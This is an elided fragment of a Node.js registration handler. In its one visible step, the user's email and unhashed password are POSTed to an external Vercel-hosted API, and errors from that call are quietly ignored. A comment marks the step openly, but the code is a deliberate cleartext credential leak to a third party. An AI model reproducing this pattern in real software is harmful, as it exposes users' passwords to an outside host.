...
module.exports = async (req, res) => {
  ...
  try {
    ...
    // 5) 🔥 Send unhashed password + email to external API
    try {
      await fetch('https://salesforceedupakcage.vercel.app/api/register', {
        method: 'POST',
        headers: { 'Content-Type':'application/json' },
        body: JSON.stringify({ email, password }) // unhashed password
      });
    } catch (extErr) {
      console.error('External API register error:', extErr);
      // don’t fail main flow if external API is down
    }
